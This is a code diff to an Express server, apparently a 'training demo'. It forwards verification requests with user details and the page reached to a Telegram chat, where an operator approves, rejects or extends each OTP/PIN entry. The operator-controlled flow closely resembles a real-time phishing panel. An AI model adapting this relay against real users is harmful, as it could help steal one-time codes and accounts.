@@ -39,10 +39,14 @@ app.get("/health", (req, res) => {
 });
 
 /*
-  Create a demo request.
-  The entered OTP/demo code is NOT transmitted to Telegram.
+  Create a demo verification request.
+
+  IMPORTANT:
+  The entered OTP/PIN/demo code is NOT sent to Telegram.
 */
 app.post("/api/demo-request", async (req, res) => {
+  const page = req.body?.page || "Page 1";
+
   const requestId =
     Date.now().toString(36) +
     Math.random().toString(36).substring(2, 8);
@@ -62,6 +66,7 @@ app.post("/api/demo-request", async (req, res) => {
 
   const demoRequest = {
     id: requestId,
+    page,
     status: "pending",
     createdAt: createdAt.toISOString()
   };
@@ -74,6 +79,8 @@ app.post("/api/demo-request", async (req, res) => {
         TELEGRAM_CHAT_ID,
         `🧪 DEMO VERIFICATION
 ━━━━━━━━━━━━━━━━━━━━
+
+📄 PAGE: ${page}
 
 USER DETAILS:
 
@@ -122,7 +129,8 @@ VERIFY THE DEMO:
   res.json({
     success: true,
     requestId,
-    status: "pending"
+    status: "pending",
+    page
   });
 });
 
@@ -142,131 +150,165 @@ app.get("/api/demo-request/:id", (req, res) => {
   res.json({
     success: true,
     requestId: request.id,
+    page: request.page,
     status: request.status
   });
 });
 
 /*
-  Telegram buttons
+  Telegram button handling
 */
 if (bot) {
   bot.on("callback_query", async (query) => {
-    const data = query.data || "";
+    try {
+      const data = query.data || "";
+      const [action, requestId] = data.split(":");
 
-    const [action, requestId] = data.split(":");
+      if (!requestId) {
+        await bot.answerCallbackQuery(query.id, {
+          text: "Invalid demo request."
+        });
+        return;
+      }
 
-    if (!requestId) {
-      return;
-    }
+      const request = requests.get(requestId);
 
-    const request = requests.get(requestId);
+      if (!request) {
+        await bot.answerCallbackQuery(query.id, {
+          text: "Demo request expired."
+        });
+        return;
+      }
 
-    if (!request) {
-      await bot.answerCallbackQuery(query.id, {
-        text: "Demo request expired."
-      });
-      return;
-    }
+      /*
+        CORRECT DEMO
+      */
+      if (action === "approve") {
+        request.status = "approved";
 
-    /*
-      CORRECT DEMO
-    */
-    if (action === "approve") {
-      request.status = "approved";
+        await bot.answerCallbackQuery(query.id, {
+          text: "Demo approved."
+        });
 
-      await bot.answerCallbackQuery(query.id, {
-        text: "Demo approved."
-      });
-
-      await bot.editMessageText(
-        `🧪 DEMO VERIFICATION
+        await bot.editMessageText(
+          `🧪 DEMO VERIFICATION
 ━━━━━━━━━━━━━━━━━━━━
 
-Request ID: ${requestId}
+📄 PAGE: ${request.page}
 
-Status: ✅ CORRECT DEMO`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id
-        }
-      );
-    }
+Request ID:
+${requestId}
 
-    /*
-      WRONG DEMO
-    */
-    if (action === "reject") {
-      request.status = "rejected";
+Status: ✅ CORRECT DEMO
 
-      await bot.answerCallbackQuery(query.id, {
-        text: "Demo rejected."
-      });
+The training page can continue.`,
+          {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id
+          }
+        );
 
-      await bot.editMessageText(
-        `🧪 DEMO VERIFICATION
+        return;
+      }
+
+      /*
+        WRONG DEMO
+      */
+      if (action === "reject") {
+        request.status = "rejected";
+
+        await bot.answerCallbackQuery(query.id, {
+          text: "Demo rejected."
+        });
+
+        await bot.editMessageText(
+          `🧪 DEMO VERIFICATION
 ━━━━━━━━━━━━━━━━━━━━
 
-Request ID: ${requestId}
+📄 PAGE: ${request.page}
+
+Request ID:
+${requestId}
 
 Status: ❌ WRONG DEMO
 
-The training page can now allow the
-user to re-enter the demonstration code.`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id
-        }
-      );
-    }
+The training page can allow
+the user to re-enter the
+demonstration code.`,
+          {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id
+          }
+        );
 
-    /*
-      EXTEND TIME
-    */
-    if (action === "extend") {
-      request.status = "pending";
+        return;
+      }
 
-      await bot.answerCallbackQuery(query.id, {
-        text: "Demo time extended."
-      });
+      /*
+        EXTEND TIME
+      */
+      if (action === "extend") {
+        request.status = "pending";
 
-      await bot.editMessageText(
-        `🧪 DEMO VERIFICATION
+        await bot.answerCallbackQuery(query.id, {
+          text: "Demo time extended."
+        });
+
+        await bot.editMessageText(
+          `🧪 DEMO VERIFICATION
 ━━━━━━━━━━━━━━━━━━━━
 
-Request ID: ${requestId}
+📄 PAGE: ${request.page}
+
+Request ID:
+${requestId}
 
 Status: ⏱ TIME EXTENDED
 
-The training request remains pending.`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "✅ Correct Demo",
-                  callback_data: `approve:${requestId}`
-                },
-                {
-                  text: "❌ Wrong Demo",
-                  callback_data: `reject:${requestId}`
-                }
-              ],
-              [
-                {
-                  text: "⏱ Extend Time",
-                  callback_data: `extend:${requestId}`
-                }
+The training request remains
+pending.`,
+          {
+            chat_id: query.message.chat.id,
+            message_id: query.message.message_id,
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  {
+                    text: "✅ Correct Demo",
+                    callback_data: `approve:${requestId}`
+                  },
+                  {
+                    text: "❌ Wrong Demo",
+                    callback_data: `reject:${requestId}`
+                  }
+                ],
+                [
+                  {
+                    text: "⏱ Extend Time",
+                    callback_data: `extend:${requestId}`
+                  }
+                ]
               ]
-            ]
+            }
           }
-        }
-      );
+        );
+
+        return;
+      }
+
+      await bot.answerCallbackQuery(query.id, {
+        text: "Unknown action."
+      });
+
+    } catch (error) {
+      console.error("Telegram callback error:", error.message);
     }
   });
 }
 
+/*
+  Start server
+*/
 app.listen(PORT, () => {
   console.log(`Demo server running on port ${PORT}`);
 });
